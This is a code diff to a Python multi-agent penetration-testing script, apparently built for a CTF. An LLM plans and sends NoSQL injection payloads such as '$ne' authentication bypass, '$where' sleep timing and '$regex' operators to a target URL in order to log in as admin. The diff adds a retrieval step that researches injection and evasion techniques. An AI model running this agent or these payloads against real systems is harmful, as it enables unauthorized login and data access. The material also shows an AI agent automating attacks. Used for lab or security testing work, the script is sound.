@@ -21,75 +21,11 @@ nest_asyncio.apply()
 warnings.filterwarnings("ignore", category=ResourceWarning)
 
 
-class ScanForNoSQLIInput(BaseModel):
-    """Input schema for NoSQL injection scanner."""
-    url: str = Field(description="The target URL (API endpoint) to scan for NoSQL injection vulnerabilities")
-    fields: Union[List[str], str] = Field(description="Form fields to test, as a list of strings of field names eg. ['username', 'password']")
-
-
-class ScanForNoSQLITool(BaseTool):
-    name: str = "scan_for_nosqli"
-    description: str = "Scans a web application for NoSQL injection vulnerabilities by testing form fields"
-    args_schema: Type[BaseModel] = ScanForNoSQLIInput
-
-    def __init__(self, **kwargs):
-        super().__init__(**kwargs)
-        self._state = 0  # keeps track of last returned index
-
-    def _run(self, url: str, fields: Union[List[str], str]) -> str:
-        res = [
-            f'''
-Found Error NoSQL Injection:
-        URL: {url}
-        param:
-        Injection: {{"foo": 1}}=
-''',
-            f'''
-Found Error NoSQL Injection:
-        URL: {url}
-        param:
-        Injection: {{"foo": 1}}=
-''',
-            f'''
-Found Blind NoSQL Injection:
-        URL: {url}
-        param:
-        Injection: =true: {{"$where":  "return true"}}, false: {{"$where":  "return false"}}
-''',
-            f'''
-Found Blind NoSQL Injection:
-        URL: {url}
-        param:
-        Injection: =true: {{"$where":  "return true"}}, false: {{"$or": [{{"foo":"1"}},{{"foo":"1"}}]}}
-''',
-            f'''
-Found Blind NoSQL Injection:
-        URL: {url}
-        param:
-        Injection: =true: {{"$or": [{{}},{{"foo":"1"}}]}}, false: {{"$or": [{{"foo":"1"}},{{"foo":"1"}}]}}
-''',
-            f'''
-Found Timing based NoSQL Injection:
-        URL: {url}
-        param:
-        Injection: Whole Body={{"$where":  "sleep(500)"}}
-''']
-
-        # get the current result and increment counter
-        result = res[0:self._state % len(res)+1]
-        result = '\n'.join(result)
-        self._state += 1
-        return result
-
-    async def _arun(self, url: str, fields: Union[List[str], str]) -> str:
-        """Async version (runs sync code in a thread)."""
-        return await asyncio.to_thread(self._run, url, fields)
-
-
 if len(sys.argv) < 3:
     print("Usage: python main.py <url> <model>")
     sys.exit(1)
 
+from static5 import ScanForNoSQLIInput, ScanForNoSQLITool
 
 def fetch_initial_scrape(url: str) -> str:
     """
@@ -113,19 +49,26 @@ def fetch_initial_scrape(url: str) -> str:
 async def main():
     start_time = time.perf_counter()
 
-
     scanner_tool = ScanForNoSQLITool()
+    
+    # Initialize RAG tool
+    print("[*] Initializing RAG tool...")
+    from tools.all_tools import rag
+    rag_tool = rag(
+        json_path="nosql_injection_knowledge.json",  # Update with your actual path
+        name="nosql_injection_knowledge",
+        description="Retrieves information about NoSQL injection techniques, payloads, and best practices from a curated knowledge base. Use this to get expert guidance on crafting effective NoSQL injection payloads."
+    )
 
     url = sys.argv[1]
     MODEL = sys.argv[2]
-
 
     goal = "login with username 'admin' using nosql injection and retrieve ctf flag"
 
     print("[*] Fetching initial website scrape...")
     website_scrape = fetch_initial_scrape(url)
 
-    # Define extended state for full workflow
+    # workflow state
     class FullPentestState(TypedDict):
         url: str
         goal: str
@@ -134,6 +77,7 @@ async def main():
         messages: List[Any]
         scanner_tool_inputs: Optional[Any]
         manual_scan_report: Optional[str]
+        planner_research: Optional[str]  # NEW: stores RAG research
         planner_output: Optional[Any]
         attack_results: Optional[List[Any]]
         critic_decision: Optional[str]
@@ -144,7 +88,6 @@ async def main():
     async def scanner_input_structurer(state: FullPentestState):
         """Structure scanner inputs directly from website scrape."""
         
-        # Build the prompt with context
         prompt = f"""
 You are a Scanner Input Structurer analyzing a website to determine NoSQL injection scanner inputs.
 
@@ -186,7 +129,6 @@ Return the scanner tool inputs with:
     async def manual_scanner(state: FullPentestState):
         """Run the manual NoSQL scanner tool."""
         
-        
         res = await scanner_tool.arun({
             "url": state["entry_point"],
             "fields": state["fields"],
@@ -198,10 +140,23 @@ Return the scanner tool inputs with:
         return {"manual_scan_report": res}
 
     async def planner_agent(state: FullPentestState):
-        """Generate 5 payload variations based on manual scan results."""
+        """Research NoSQL injection techniques using RAG tool."""
         
-        prompt = f"""
-You are a Penetration Testing Planner Agent creating NoSQL injection payloads.
+        # Use LangChain's ChatOllama with tool binding for RAG
+        from langchain_ollama.chat_models import ChatOllama
+        from langchain_core.messages import HumanMessage, SystemMessage
+        
+        llm = ChatOllama(
+            model=MODEL,
+            temperature=0.3,
+            timeout=120,
+        )
+        
+        # Bind the RAG tool to the LLM
+        llm_with_tools = llm.bind_tools([rag_tool])
+        
+        research_prompt = f"""
+You are a Penetration Testing Planner researching NoSQL injection techniques.
 
 === TARGET URL ===
 {state['entry_point']}
@@ -215,22 +170,97 @@ You are a Penetration Testing Planner Agent creating NoSQL injection payloads.
 === MANUAL SCAN REPORT ===
 {state['manual_scan_report']}
 
-Based on the manual scan findings, generate 5 specific NoSQL injection payloads to test.
+Your task is to research effective NoSQL injection techniques for this scenario.
+
+Use the nosql_injection_knowledge tool to:
+1. Query for authentication bypass techniques
+2. Query for field-specific injection methods for the detected fields
+3. Query for payload variations that work against common NoSQL databases (MongoDB, CouchDB, etc.)
+4. Query for evasion techniques if defenses are detected
+
+Make multiple queries to gather comprehensive information. Focus on:
+- Payloads that bypass authentication
+- Boolean-based blind injection
+- JavaScript injection techniques
+- Query operator manipulation
+- Timing-based detection methods
+
+Provide a summary of the most relevant techniques and payload patterns for this target.
+"""
+        
+        messages = [
+            SystemMessage(content="You are a security researcher with access to a NoSQL injection knowledge base."),
+            HumanMessage(content=research_prompt)
+        ]
+        
+        print("\n=== PLANNER RESEARCH PHASE ===")
+        print("Querying RAG knowledge base for NoSQL injection techniques...")
+        
+        # Invoke with tools
+        research_output = []
+        response = await llm_with_tools.ainvoke(messages)
+        
+        # Process tool calls if any
+        while response.tool_calls:
+            research_output.append(f"\nQuery: {response.tool_calls[0]['args']}")
+            
+            for tool_call in response.tool_calls:
+                tool_result = rag_tool.invoke(tool_call["args"])
+                research_output.append(f"Result: {tool_result}\n")
+                print(f"  RAG Query: {tool_call['args']}")
+                print(f"  Retrieved: {tool_result[:200]}...")
+            
+            # Continue conversation with tool results
+            messages.append(response)
+            messages.append(HumanMessage(content="Continue researching or provide your final summary."))
+            response = await llm_with_tools.ainvoke(messages)
+        
+        # Get final summary
+        research_output.append(f"\nFinal Summary: {response.content}")
+        research_text = "\n".join(research_output)
+        
+        print("\n=== RESEARCH COMPLETE ===")
+        print(research_text[:500] + "...")
+        
+        return {"planner_research": research_text}
+
+    async def planner_structurer(state: FullPentestState):
+        """Generate structured payloads based on RAG research."""
+        
+        prompt = f"""
+You are a Penetration Testing Payload Generator creating NoSQL injection payloads.
+
+=== TARGET URL ===
+{state['entry_point']}
+
+=== FIELDS REQUIRED ===
+{state['fields']}
+
+=== GOAL ===
+{state['goal']}
+
+=== MANUAL SCAN REPORT ===
+{state['manual_scan_report']}
+
+=== RESEARCH FROM KNOWLEDGE BASE ===
+{state['planner_research']}
+
+Based on the research findings above, generate 5 specific NoSQL injection payloads to test.
 Each payload should be ready to send in a POST request body.
 
-Target different NoSQL injection techniques as you see fit:
-1. Blind boolean-based injection
-2. Timing-based injection
-3. Authentication bypass
-4. Query operator injection
+Use the techniques identified in the research phase. Target different NoSQL injection techniques:
+1. Authentication bypass (e.g., {{"$ne": null}})
+2. Blind boolean-based injection
+3. Timing-based injection
+4. Query operator injection (e.g., $gt, $regex, $where)
 5. JavaScript injection
 
 Each payload must include:
-- field_name: Which field to inject into (e.g., "username", "password")
-- payload: The actual injection string
+- field_names: List of fields to inject into (matching the detected fields)
+- payloads: List of actual injection strings/objects (one per field, in order)
 - description: What vulnerability/technique this tests
 
-Return the endpoint URL and 5 payloads.
+Return the endpoint URL and 5 payloads based on the research.
 """
         
         result = await call_ollama_with_json(
@@ -282,7 +312,7 @@ Return the endpoint URL and 5 payloads.
                 result = {
                     "payload": payload_obj,
                     "status_code": response.status_code,
-                    "response_body": response.text,  # Truncate for safety
+                    "response_body": response.text, 
                     "success": response.status_code == 200
                 }
                 
@@ -312,6 +342,9 @@ You are a Penetration Test Critic Agent evaluating attack results.
 
 === MANUAL SCAN REPORT ===
 {state['manual_scan_report']}
+
+=== RESEARCH CONDUCTED ===
+{state['planner_research'][:500]}...
 
 === PAYLOADS USED ===
 {json.dumps(state['planner_output'], indent=2)}
@@ -369,6 +402,9 @@ You are a Penetration Test Report Writer creating a comprehensive security asses
 === MANUAL SCAN REPORT ===
 {state['manual_scan_report']}
 
+=== RESEARCH CONDUCTED ===
+{state['planner_research']}
+
 === ALL PAYLOADS TESTED ===
 {json.dumps(state['planner_output'], indent=2)}
 
@@ -386,7 +422,7 @@ Using the attempt history and the confirmed successful payload, produce a concis
 1. **Executive Summary**
     - One-paragraph overview of objectives and outcome.
 2. **Methodology**
-    - Briefly describe each phase (Scanning → Planning → Attacking → Evaluation → Critique).
+    - Briefly describe each phase (Scanning → Research → Planning → Attacking → Evaluation → Critique).
 3. **Key Findings**
     - Bullet-list of tested entry points, observed failure modes, and the one that succeeded.
 4. **Successful Exploit Details**
@@ -401,12 +437,11 @@ Using the attempt history and the confirmed successful payload, produce a concis
 No Additional text.
 """
         
-        # For report, we can use dict as schema to allow free-form structure
         result = await call_ollama_with_json(
             MODEL,
             prompt,
-            dict,  # Allow free-form report structure
-            print_output=False  # Don't use default pretty print for reports
+            dict, 
+            print_output=False  
         )
         
         print("\n=== FINAL REPORT GENERATED ===")
@@ -421,37 +456,37 @@ No Additional text.
         if decision == "rescan":
             return "manual_scanner"
         elif decision == "replan":
-            return "planner_agent"
+            return "planner_agent"  # Goes back to research phase
         elif decision == "success":
             return "report_writer"
-        else:  # failure or max iterations
+        else:  
             return END
 
-    # Build the workflow graph
     graph = StateGraph(FullPentestState)
     
-    # Add all nodes
+    # add all nodes
     graph.add_node("scanner_input_structurer", scanner_input_structurer)
     graph.add_node("manual_scanner", manual_scanner)
-    graph.add_node("planner_agent", planner_agent)
+    graph.add_node("planner_agent", planner_agent) 
+    graph.add_node("planner_structurer", planner_structurer)  
     graph.add_node("attacker_agent", attacker_agent)
     graph.add_node("critic_agent", critic_agent)
     graph.add_node("report_writer", report_writer_agent)
 
-    # Define edges
+    # edges
     graph.add_edge(START, "scanner_input_structurer")
     graph.add_edge("scanner_input_structurer", "manual_scanner")
     graph.add_edge("manual_scanner", "planner_agent")
-    graph.add_edge("planner_agent", "attacker_agent")
+    graph.add_edge("planner_agent", "planner_structurer")  
+    graph.add_edge("planner_structurer", "attacker_agent")
     graph.add_edge("attacker_agent", "critic_agent")
     
-    # Conditional routing after critic
     graph.add_conditional_edges(
         "critic_agent",
         route_after_critic,
         {
             "manual_scanner": "manual_scanner",
-            "planner_agent": "planner_agent",
+            "planner_agent": "planner_agent",  
             "report_writer": "report_writer",
             END: END
         }
@@ -471,6 +506,7 @@ No Additional text.
             "website_scrape": website_scrape,
             "scanner_tool_inputs": None,
             "manual_scan_report": None,
+            "planner_research": None,  
             "planner_output": None,
             "attack_results": None,
             "critic_decision": None,
@@ -478,17 +514,14 @@ No Additional text.
             "iteration_count": 0,
             "entry_point": "",
             "fields": [],
-            
-            
         }
     )
 
+    # calculate and output time taken for data collection
     end_time = time.perf_counter()
-
     elapsed_time = end_time - start_time
     print("\n=== TIME TAKEN ===")
     print(f"{elapsed_time:.4f} seconds")
-
 
 
 if __name__ == "__main__":
